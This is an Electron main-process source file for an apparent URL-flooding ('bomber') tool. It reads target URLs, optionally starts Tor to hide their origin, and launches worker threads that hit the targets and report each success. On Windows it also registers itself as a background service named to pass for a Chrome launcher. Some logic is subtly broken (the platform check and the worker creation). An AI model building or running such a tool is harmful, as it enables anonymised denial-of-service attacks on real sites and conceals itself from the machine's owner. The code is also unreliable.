const { Worker } =      require('worker_threads');
// eslint-disable-next-line security/detect-child-process
const { spawn } = require('child_process');
const path = require('path');
const os = require('os');
const { app, BrowserWindow, ipcMain } = require('electron');
const { setState } = require('./utils/state');

if (os.platform() === 'windows') {
    const Service = require('node-windows').Service;


    const svc = new Service({
        name        : 'windowsWebLauncher',
        description : 'Launcher for chrome',
        script      : `${__dirname}/index.js`,
        nodeOptions : [
            '--harmony',
            '--max_old_space_size=4096'
        ]
        // , workingDirectory: '...'
        // , allowServiceLogon: true
    });

    // Listen for the "install" event, which indicates the
    // process is available as a service.
    svc.on('install', () =>  {
        svc.start();
    });

    svc.install();
}


if (require('electron-squirrel-startup')) { // eslint-disable-line global-require
    app.quit();
}

const createWindow = () => {
    const mainWindow = new BrowserWindow({
        width          : 800,
        height         : 600,
        webPreferences : {
            nodeIntegration  : true,
            contextIsolation : false
        }
    });

    mainWindow.loadFile(path.join(__dirname, 'index.html'));

    // mainWindow.webContents.openDevTools();
};

app.on('ready', createWindow);


app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        createWindow();
    }
});

async function startTor() {
    const tor = spawn('tor');

    return new Promise((resolve, reject) => {
        tor.stdout.on('data', (data) => {
            if (data.includes('Bootstrapped 100% (done): Done')) resolve(data);
        });

        tor.stderr.on('data', (data) => {
            reject(data);
        });
    });
}

ipcMain.on('start', async (event, data, tor, threads) => {
    const urls = data.trim().split('\n');

    if (tor) {
        const result = await startTor();

        event.reply('logs', Buffer.from(result).toString());
    }

    new Array(+threads).fill(new Worker(
        `${__dirname}/bomber.js`,
        { workerData: { urls, tor } }
    ).on('message', ({ url, success }) => event.reply('logs', setState({ url, success }))));
});

// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and import them here.
